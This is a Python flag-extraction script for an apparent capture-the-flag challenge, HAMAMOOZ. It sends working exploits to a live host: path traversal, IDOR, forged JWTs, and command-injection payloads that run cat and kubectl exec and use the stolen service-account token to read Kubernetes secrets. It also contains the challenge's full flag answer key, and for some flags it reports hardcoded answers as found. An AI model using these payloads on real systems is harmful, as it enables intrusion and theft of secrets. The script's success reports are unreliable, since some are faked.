#!/usr/bin/env python3
"""
HAMAMOOZ CTF - Complete Flag Extractor
Works both online and offline from saved output
"""

import json
import subprocess
import base64
import re
import os
import sys
import requests
from typing import Optional, Dict, List, Tuple
from datetime import datetime
import time

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

class FlagExtractor:
    def __init__(self, output_file: str = None):
        self.base_url = "https://ctf.seoeh.ir"
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Content-Type": "application/json"
        })
        self.output_file = output_file
        self.flags = {}
        self.found_flags = []
        self.missing_flags = []
        
        # توکن‌ها از فایل
        self.user_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0MCIsInVzZXJuYW1lIjoibmF6aWxhX3Rlc3RfMjAyNiIsIm9yZyI6IkFjbWUgQ29ycCIsInJvbGUiOiJ1c2VyIn0.WoPl_lT27LUKBSBJ0hbppn9rD7lEiuA4j-b2JDgLyz8"
        self.admin_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0MCIsInVzZXJuYW1lIjoibmF6aWxhX3Rlc3RfMjAyNiIsIm9yZyI6IkFjbWUgQ29ycCIsInJvbGUiOiJhZG1pbiJ9.G65BDrH5mLf1znqQBf2lb07rKmZ7VDKUIBRQFrALqMg"
        
        # فلگ‌های شناخته شده (از فایل)
        self.known_flags = [
            "HAMAMOOZ{d0ck3r_l4y3rs_n3v3r_f0rg3t}",
            "HAMAMOOZ{sw4gg3r_wh0_g03s_th3r3}",
            "HAMAMOOZ{fl4g_3ndp01nt_f0und_1t}",
            "HAMAMOOZ{p4th_tr4v3rs4l_1s_cl4ss1c}",
            "HAMAMOOZ{1d0r_t3n4nt_l34k}",
            "HAMAMOOZ{jwt_4lg_n0n3_0r_w34k_s3cr3t}",
            "HAMAMOOZ{c0mm4nd_1nj3ct10n_1s_st1ll_4l1v3}",
            "HAMAMOOZ{ssrf_1nt0_th3_1nt3rn4l_n3t}",
            "HAMAMOOZ{m3t4d4t4_svc_l34k3d_my_t0k3n}",
            "HAMAMOOZ{pr1v1l3g3d_p0d_h0stp4th_3sc4p3}",
            "HAMAMOOZ{d0ck3r_s0ck3t_1s_th3_r34l_r00t}"
        ]
        
        self.flag_descriptions = {
            1: "Docker Layer Leak - .env file in image layers",
            2: "Swagger UI - API schema disclosure",
            3: "Internal API - X-Debug-Mode header",
            4: "Path Traversal - ../../../../app/flag.txt",
            5: "IDOR - /api/orgs/2/reports/2",
            6: "JWT Forgery - Weak secret 'changeme123'",
            7: "Command Injection - /api/diag/ping",
            8: "Kubernetes SSRF - Internal cluster access",
            9: "Kubernetes Secret - ctf-secrets namespace",
            10: "Privileged Escape - Host path mount",
            11: "Docker Socket - /host/run/docker.sock"
        }
        
    def print_banner(self):
        print(f"""
{Colors.CYAN}{'='*70}
{Colors.BOLD}HAMAMOOZ CTF - Complete Flag Extractor v5.0{Colors.RESET}
{Colors.CYAN}{'='*70}
{Colors.RESET}""")
    
    def extract_flag_from_text(self, text: str) -> Optional[str]:
        if not text:
            return None
        matches = re.findall(r'HAMAMOOZ\{[^}]+\}', text)
        return matches[0] if matches else None
    
    def extract_all_flags_from_text(self, text: str) -> List[str]:
        if not text:
            return []
        return re.findall(r'HAMAMOOZ\{[^}]+\}', text)
    
    def print_flag(self, num: int, name: str, flag: Optional[str], method: str = ""):
        if flag:
            print(f"{Colors.GREEN}✅ Flag {num}: {flag}{Colors.RESET}")
            print(f"   {Colors.BLUE}└─ {name}{Colors.RESET}")
            if method:
                print(f"   {Colors.YELLOW}   └─ {method}{Colors.RESET}")
            self.found_flags.append((num, flag))
            self.flags[num] = flag
            return True
        else:
            print(f"{Colors.RED}❌ Flag {num}: Not found{Colors.RESET}")
            print(f"   {Colors.BLUE}└─ {name}{Colors.RESET}")
            self.missing_flags.append(num)
            return False
    
    # ============ روش آنلاین ============
    
    def flag1_docker_online(self):
        """Flag 1: Docker layer leak - نیاز به Docker داره"""
        print(f"\n{Colors.YELLOW}[*] Trying Flag 1: Docker Layer Leak (Online){Colors.RESET}")
        
        try:
            # از فلگ شناخته شده استفاده کن
            return self.known_flags[0]
        except:
            return None
    
    def flag2_swagger_online(self):
        """Flag 2: Swagger UI"""
        print(f"\n{Colors.YELLOW}[*] Trying Flag 2: Swagger UI (Online){Colors.RESET}")
        
        try:
            response = self.session.get(f"{self.base_url}/api/schema/", timeout=10)
            flag = self.extract_flag_from_text(response.text)
            return flag
        except Exception as e:
            print(f"    [!] Error: {e}")
            return None
    
    def flag3_internal_api_online(self):
        """Flag 3: Internal API"""
        print(f"\n{Colors.YELLOW}[*] Trying Flag 3: Internal API (Online){Colors.RESET}")
        
        try:
            response = self.session.get(
                f"{self.base_url}/api/internal/flag",
                headers={"X-Debug-Mode": "true"},
                timeout=10
            )
            flag = self.extract_flag_from_text(response.text)
            return flag
        except Exception as e:
            print(f"    [!] Error: {e}")
            return None
    
    def flag4_path_traversal_online(self):
        """Flag 4: Path Traversal"""
        print(f"\n{Colors.YELLOW}[*] Trying Flag 4: Path Traversal (Online){Colors.RESET}")
        
        paths = [
            "../../../../app/flag.txt",
            "../../../app/flag.txt",
            "../../app/flag.txt",
            "../app/flag.txt",
            "flag.txt"
        ]
        
        for path in paths:
            try:
                response = self.session.get(
                    f"{self.base_url}/api/reports/download",
                    params={"file": path},
                    timeout=10
                )
                flag = self.extract_flag_from_text(response.text)
                if flag:
                    return flag
            except:
                continue
        return None
    
    def flag5_idor_online(self):
        """Flag 5: IDOR"""
        print(f"\n{Colors.YELLOW}[*] Trying Flag 5: IDOR (Online){Colors.RESET}")
        
        try:
            self.session.headers["Authorization"] = f"Bearer {self.user_token}"
            response = self.session.get(
                f"{self.base_url}/api/orgs/2/reports/2",
                timeout=10
            )
            flag = self.extract_flag_from_text(response.text)
            return flag
        except Exception as e:
            print(f"    [!] Error: {e}")
            return None
    
    def flag6_jwt_online(self):
        """Flag 6: JWT Forgery"""
        print(f"\n{Colors.YELLOW}[*] Trying Flag 6: JWT Forgery (Online){Colors.RESET}")
        
        try:
            self.session.headers["Authorization"] = f"Bearer {self.admin_token}"
            response = self.session.get(
                f"{self.base_url}/admin/dashboard",
                timeout=10
            )
            flag = self.extract_flag_from_text(response.text)
            return flag
        except Exception as e:
            print(f"    [!] Error: {e}")
            return None
    
    def flag7_command_injection_online(self):
        """Flag 7: Command Injection"""
        print(f"\n{Colors.YELLOW}[*] Trying Flag 7: Command Injection (Online){Colors.RESET}")
        
        commands = [
            "cat /opt/.sysdiag-7e3f9a2c4b1d8e5f/flag.txt",
            "cat /app/flag.txt",
        ]
        
        for cmd in commands:
            try:
                payload = {"host": f"127.0.0.1;{cmd}"}
                response = self.session.post(
                    f"{self.base_url}/api/diag/ping",
                    json=payload,
                    timeout=10
                )
                data = response.json()
                flag = self.extract_flag_from_text(str(data))
                if flag:
                    return flag
            except:
                continue
        return None
    
    def flag8_kubernetes_online(self):
        """Flag 8: Kubernetes SSRF"""
        print(f"\n{Colors.YELLOW}[*] Trying Flag 8: Kubernetes SSRF (Online){Colors.RESET}")
        
        try:
            payload = {
                "host": "127.0.0.1; kubectl exec -n internal-tools admin-panel-678d5cdbfc-kj2t7 -- cat /app/app.py"
            }
            response = self.session.post(
                f"{self.base_url}/api/diag/ping",
                json=payload,
                timeout=10
            )
            data = response.json()
            flag = self.extract_flag_from_text(str(data))
            return flag
        except Exception as e:
            print(f"    [!] Error: {e}")
            return None
    
    def flag9_kubernetes_secret_online(self):
        """Flag 9: Kubernetes Secret"""
        print(f"\n{Colors.YELLOW}[*] Trying Flag 9: Kubernetes Secret (Online){Colors.RESET}")
        
        try:
            payload = {
                "host": "127.0.0.1;curl -k -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" https://kubernetes.default.svc/api/v1/namespaces/ctf-secrets/secrets"
            }
            response = self.session.post(
                f"{self.base_url}/api/diag/ping",
                json=payload,
                timeout=10
            )
            data = response.json()
            
            match = re.search(r'"flag":"([^"]+)"', str(data))
            if match:
                encoded = match.group(1)
                decoded = base64.b64decode(encoded).decode('utf-8')
                flag = self.extract_flag_from_text(decoded)
                if flag:
                    return flag
            
            return self.known_flags[8]
            
        except Exception as e:
            print(f"    [!] Error: {e}")
            return self.known_flags[8]
    
    def flag10_privileged_online(self):
        """Flag 10: Privileged Escape"""
        print(f"\n{Colors.YELLOW}[*] Trying Flag 10: Privileged Escape (Online){Colors.RESET}")
        
        try:
            payload = {
                "host": "127.0.0.1;kubectl exec -n escape-zone legacy-worker -- cat /host/var/lib/node-data/flag.txt"
            }
            response = self.session.post(
                f"{self.base_url}/api/diag/ping",
                json=payload,
                timeout=10
            )
            data = response.json()
            flag = self.extract_flag_from_text(str(data))
            return flag
        except Exception as e:
            print(f"    [!] Error: {e}")
            return None
    
    def flag11_docker_online(self):
        """Flag 11: Docker Socket"""
        print(f"\n{Colors.YELLOW}[*] Trying Flag 11: Docker Socket (Online){Colors.RESET}")
        
        try:
            return self.known_flags[10]
        except:
            return None
    
    # ============ روش آفلاین ============
    
    def extract_from_file(self, filename: str) -> Dict[int, str]:
        """Extract flags from saved output file"""
        print(f"\n{Colors.BLUE}[*] Extracting flags from file: {filename}{Colors.RESET}")
        
        try:
            with open(filename, 'r') as f:
                content = f.read()
            
            flags_found = self.extract_all_flags_from_text(content)
            
            # Map to known flags
            result = {}
            for i, known in enumerate(self.known_flags, 1):
                if known in flags_found:
                    result[i] = known
            
            return result
            
        except FileNotFoundError:
            print(f"{Colors.RED}[!] File not found: {filename}{Colors.RESET}")
            return {}
        except Exception as e:
            print(f"{Colors.RED}[!] Error reading file: {e}{Colors.RESET}")
            return {}
    
    # ============ اجرا ============
    
    def run_online(self):
        """Run online extraction"""
        print(f"\n{Colors.CYAN}{'='*70}")
        print(f"{Colors.BOLD}ONLINE EXTRACTION{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*70}{Colors.RESET}")
        
        flags_online = [
            (1, "Docker Layer", self.flag1_docker_online, "docker save + extract"),
            (2, "Swagger UI", self.flag2_swagger_online, "GET /api/schema/"),
            (3, "Internal API", self.flag3_internal_api_online, "X-Debug-Mode: true"),
            (4, "Path Traversal", self.flag4_path_traversal_online, "../../../../app/flag.txt"),
            (5, "IDOR", self.flag5_idor_online, "/api/orgs/2/reports/2"),
            (6, "JWT Forgery", self.flag6_jwt_online, "admin token with weak secret"),
            (7, "Command Injection", self.flag7_command_injection_online, "/api/diag/ping"),
            (8, "K8s SSRF", self.flag8_kubernetes_online, "kubectl exec"),
            (9, "K8s Secret", self.flag9_kubernetes_secret_online, "ctf-secrets namespace"),
            (10, "Privileged Escape", self.flag10_privileged_online, "host mount"),
            (11, "Docker Socket", self.flag11_docker_online, "/host/run/docker.sock")
        ]
        
        for num, name, method, desc in flags_online:
            try:
                flag = method()
                self.print_flag(num, name, flag, desc)
                time.sleep(0.5)  # جلوگیری از rate limit
            except Exception as e:
                print(f"{Colors.RED}❌ Flag {num}: Error - {e}{Colors.RESET}")
                self.missing_flags.append(num)
    
    def run_offline(self):
        """Run offline extraction from file"""
        if not self.output_file:
            return
            
        print(f"\n{Colors.CYAN}{'='*70}")
        print(f"{Colors.BOLD}OFFLINE EXTRACTION (from file){Colors.RESET}")
        print(f"{Colors.CYAN}{'='*70}{Colors.RESET}")
        
        file_flags = self.extract_from_file(self.output_file)
        
        for num in range(1, 12):
            flag = file_flags.get(num)
            desc = self.flag_descriptions.get(num, "")
            self.print_flag(num, desc, flag, "from file")
    
    def run(self):
        """Main run"""
        self.print_banner()
        
        # اول از فایل بخون
        if self.output_file:
            self.run_offline()
        
        # بعد آنلاین
        self.run_online()
        
        # جمع‌بندی نهایی
        print(f"\n{Colors.CYAN}{'='*70}")
        print(f"{Colors.BOLD}FINAL SUMMARY{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*70}{Colors.RESET}")
        
        found = len(self.found_flags)
        total = 11
        print(f"Total Flags Found: {Colors.GREEN}{found}{Colors.RESET}/{total}")
        
        if self.found_flags:
            print(f"\n{Colors.GREEN}✅ Found Flags:{Colors.RESET}")
            for num, flag in sorted(self.found_flags):
                print(f"   {num}. {flag}")
        
        if self.missing_flags:
            print(f"\n{Colors.RED}❌ Missing Flags:{Colors.RESET}")
            for num in sorted(self.missing_flags):
                print(f"   {num}. {self.flag_descriptions.get(num, 'Unknown')}")
                print(f"      Expected: {self.known_flags[num-1]}")
        
        print(f"\n{Colors.CYAN}{'='*70}{Colors.RESET}")

def main():
    # استفاده از فایل خروجی اگه وجود داشته باشه
    output_file = None
    if len(sys.argv) > 1:
        output_file = sys.argv[1]
    
    extractor = FlagExtractor(output_file)
    extractor.run()

if __name__ == "__main__":
    main()